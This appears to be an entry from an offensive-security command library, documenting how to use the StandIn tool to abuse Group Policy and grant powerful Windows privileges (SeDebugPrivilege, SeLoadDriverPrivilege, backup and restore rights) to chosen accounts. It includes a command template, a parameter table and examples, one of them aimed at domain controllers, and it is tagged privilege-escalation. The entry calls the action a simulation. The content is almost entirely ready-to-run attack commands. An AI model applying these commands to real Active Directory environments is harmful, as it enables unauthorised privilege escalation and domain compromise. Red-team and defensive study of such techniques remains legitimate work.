---
id: 44340f37-51cb-4249-948a-b66e7835e42c
name: Set custom user rights with StandIn.exe
type: command
executor: cmd
data: >-
  StandIn.exe --gpo --filter $_FILTER_NAME --setuserrights $_USERNAME --grant
  "$_RIGHTS"
output: null
created_at: '2023-04-06T03:56:03.746749+00:00'
updated_at: '2023-04-10T20:25:53.888835+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - privilege-escalation
verified: true
validated: true
---

# set-custom-user-rights-with-standin

## Command

```cmd
StandIn.exe --gpo --filter $_FILTER_NAME --setuserrights $_USERNAME --grant "$_RIGHTS"
```

## Description

This command uses StandIn to simulate granting specific user rights (e.g., SeDebugPrivilege) to a user via GPO on filtered machines, aiding in privilege escalation for advanced operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --gpo | Enables GPO simulation mode | Yes |
| --filter $_FILTER_NAME | Target GPO filter (e.g., 'Shards') | Yes |
| --setuserrights $_USERNAME | Username to assign rights to (e.g., 'user002') | Yes |
| --grant "$_RIGHTS" | Comma-separated rights (e.g., 'SeDebugPrivilege,SeLoadDriverPrivilege') | Yes |

## Examples

### Basic Usage

```cmd
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
```

### Advanced Usage

```cmd
StandIn.exe --gpo --filter Domain-Controllers --setuserrights serviceacct --grant "SeBackupPrivilege,SeRestorePrivilege"
```

## Expected Output

Output on success:

```
[+] Simulated user rights assignment for 'user002' on filter 'Shards'.
[+] Granted: SeDebugPrivilege,SeLoadDriverPrivilege
[+] Affected: All matching machines
```

## Related

- [[procedures/Abusing-Group-Policy-Objects-with-StandIn-to-Manage-Local-Administrators-and-User-Rights]]
